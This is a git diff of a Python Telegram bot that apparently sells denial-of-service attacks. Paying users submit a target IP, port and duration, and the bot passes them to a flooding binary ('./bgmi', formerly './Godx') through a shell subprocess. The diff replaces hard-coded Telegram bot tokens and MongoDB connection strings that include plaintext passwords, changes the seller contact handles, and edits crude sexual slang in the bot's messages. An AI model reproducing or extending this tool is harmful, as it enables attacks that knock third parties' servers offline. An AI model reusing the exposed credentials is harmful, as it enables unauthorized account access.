@@ -16,16 +16,16 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7029774286:AAFL51oE7lpcQbL_8WVI5Mjfrn2Bpz-eNdw'
-MONGO_URI = 'mongodb+srv://shapilov89:lelaudalele@abhishek.wggaw.mongodb.net'
-FORWARD_CHANNEL_ID = -4788448606
-CHANNEL_ID = -4788448606
-error_channel_id = -4788448606
+TOKEN = '7353981909:AAFxPDWWnDQFIZSWY_w_GVjcZDhGibh96Vw'
+MONGO_URI = 'mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/'
+FORWARD_CHANNEL_ID = -1002476114422
+CHANNEL_ID = -1002476114422
+error_channel_id = -1002476114422
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['abhishek']
+db = client['LEGACY']
 users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
@@ -85,8 +85,8 @@ async def start_asyncio_loop():
 
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    binary_path = "/mnt/data/Godx"  # Ensure the correct path to the binary
-    command = f"{binary_path} {target_ip} {target_port} {duration} 900"
+    binary_path = "/bgmi"  # Ensure the correct path to the binary
+    command = f"./bgmi {target_ip} {target_port} {duration} {100} 900"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
@@ -100,7 +100,7 @@ async def run_attack_command_async(target_ip, target_port, duration):
             logging.error(f"Error in attack command: {stderr.decode().strip()}")
     except Exception as e:
         logging.error(f"Failed to execute attack command: {e}")
-    process = await asyncio.create_subprocess_shell(f"./Godx {target_ip} {target_port} {duration} 900")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} {100} 900")
     await process.communicate()
 def is_user_admin(user_id, chat_id):
     try:
@@ -114,7 +114,7 @@ def approve_or_disapprove_user(message):
     is_admin = is_user_admin(user_id, CHANNEL_ID)
     cmd_parts = message.text.split()
     if not is_admin:
-        bot.send_message(chat_id, "*Please contact owner to buy it @itzmd808sahil_SELLER 😘🥰*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Please contact owner to buy it @LEGACY4REAL0 😘🥰*", parse_mode='Markdown')
         return
     if len(cmd_parts) < 2:
         bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
@@ -126,11 +126,11 @@ def approve_or_disapprove_user(message):
     if action == '/approve':
         if plan == 1:  # CHUDAI 💦
             if users_collection.count_documents({"plan": 1}) >= 99:
-                bot.send_message(chat_id, "*Approval failed: CHUDAI 💦 limit reached (99 users).*", parse_mode='Markdown')
+                bot.send_message(chat_id, "*Approval failed: Fuck 💦 limit reached (99 users).*", parse_mode='Markdown')
                 return
         elif plan == 2:  # CHUDAI SURU KARO 💦
             if users_collection.count_documents({"plan": 2}) >= 499:
-                bot.send_message(chat_id, "*Approval failed: CHUDAI SURU KARO 💦 limit reached (499 users).*", parse_mode='Markdown')
+                bot.send_message(chat_id, "*Approval failed: Fuck 💦 limit reached (499 users).*", parse_mode='Markdown')
                 return
         valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
         users_collection.update_one(
@@ -148,14 +148,14 @@ def approve_or_disapprove_user(message):
         msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
     bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
-@bot.message_handler(commands=['Chudai'])
+@bot.message_handler(commands=['LEGACY'])
 def attack_command(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
     try:
         user_data = users_collection.find_one({"user_id": user_id})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "TUM CHUDAI 💦 NHI KR SAKTE 😥. Please contact Owner. @itzmd808sahil_SELLER 🙏")
+            bot.send_message(chat_id, "WAIT 😥. Please contact Owner. @LEGACY4REAL0 🙏")
             return
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
             bot.send_message(chat_id, "Your CHUDAI 💦 is currently not available due to limit reached.")
@@ -258,4 +258,4 @@ if __name__ == "__main__":
             logging.error(f"An error occurred while polling: {e}")
         logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
         time.sleep(REQUEST_INTERVAL)
-                             
+    
